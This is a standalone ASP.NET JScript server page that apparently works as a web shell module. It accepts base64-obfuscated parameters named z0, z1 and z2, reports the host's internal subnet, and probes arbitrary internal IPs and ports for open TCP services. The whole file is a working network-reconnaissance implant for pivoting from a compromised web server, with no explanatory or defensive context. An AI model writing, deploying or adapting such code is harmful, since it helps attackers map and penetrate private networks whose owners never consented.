<%

function Base64DecodeStr(base64Str : String) : String {
    if (!base64Str)
        return "";
    var bytes : Byte[] = System.Convert.FromBase64String(base64Str);
    
    return System.Text.Encoding.UTF8.GetString(bytes);
}

function get_network_subnet() : String {
    var subnet = "192.168.1";
    var current_ip = "";

    try {
        var interfaces = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces();
        
        for (var i = 0; i < interfaces.Length; i++) {
            var ni = interfaces[i];
            
            if (ni.OperationalStatus == System.Net.NetworkInformation.OperationalStatus.Up && 
                ni.NetworkInterfaceType != System.Net.NetworkInformation.NetworkInterfaceType.Loopback) {
                
                var ipProps = ni.GetIPProperties();
                var gateways = ipProps.GatewayAddresses;
                
                if (gateways.Count > 0) {
                    var unicastAddrs = ipProps.UnicastAddresses;
                    
                    for (var j = 0; j < unicastAddrs.Count; j++) {
                        var addr = unicastAddrs[j].Address;
                        
                        if (addr.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork) {
                            current_ip = addr.ToString();
                            break;
                        }
                    }
                }
            }
            if (current_ip != "") break;
        }
    } catch (ex) {
        
    }

    if (current_ip != "") {
        var parts = current_ip.Split('.');
        if (parts.Length == 4) {
            subnet = parts[0] + "." + parts[1] + "." + parts[2];
        }
    }
    
    return subnet;
}

function main() {
    var context = System.Web.HttpContext.Current;
    if (context == null)
        return;
    
    var req = context.Request;

    var z0 = req.Item["z0"];
    if (!z0) return;

    var action = Base64DecodeStr(z0);

    if (action == "info") {
        var subnet = get_network_subnet();
        System.Web.HttpContext.Current.Response.ContentType = "application/json";
        System.Web.HttpContext.Current.Response.Write("{\"status\":\"success\",\"subnet\":\"" + subnet + "\"}");
        return;
    }

    if (action == "check") {
        var z1 = req.Item["z1"];
        var z2 = req.Item["z2"];
        if (!z1 || !z2) {
            System.Web.HttpContext.Current.Response.ContentType = "application/json";
            System.Web.HttpContext.Current.Response.Write("{\"open\":false}");
            return;
        }

        var target_ip = Base64DecodeStr(z1);
        var target_port_str = Base64DecodeStr(z2);
        var target_port = 0;
        
        try {
            target_port = System.Int32.Parse(target_port_str);
        } catch(e) {
            System.Web.HttpContext.Current.Response.ContentType = "application/json";
            System.Web.HttpContext.Current.Response.Write("{\"open\":false}");
            return;
        }

        if (target_ip == "" || target_port <= 0) {
            System.Web.HttpContext.Current.Response.ContentType = "application/json";
            System.Web.HttpContext.Current.Response.Write("{\"open\":false}");
            return;
        }

        var client : System.Net.Sockets.TcpClient = null;
        System.Web.HttpContext.Current.Response.ContentType = "application/json";

        try {
            client = new System.Net.Sockets.TcpClient();
            var result = client.BeginConnect(target_ip, target_port, null, null);
            var success = result.AsyncWaitHandle.WaitOne(1500, false);

            if (success && client.Connected) {
                System.Web.HttpContext.Current.Response.Write("{\"open\":true,\"ip\":\"" + target_ip + "\",\"port\":" + target_port + "}");
            } else {
                System.Web.HttpContext.Current.Response.Write("{\"open\":false}");
            }
        } catch (ex) {
            System.Web.HttpContext.Current.Response.Write("{\"open\":false}");
        } finally {
            if (client != null) client.Close();
        }
        return;
    }
}

main();

%>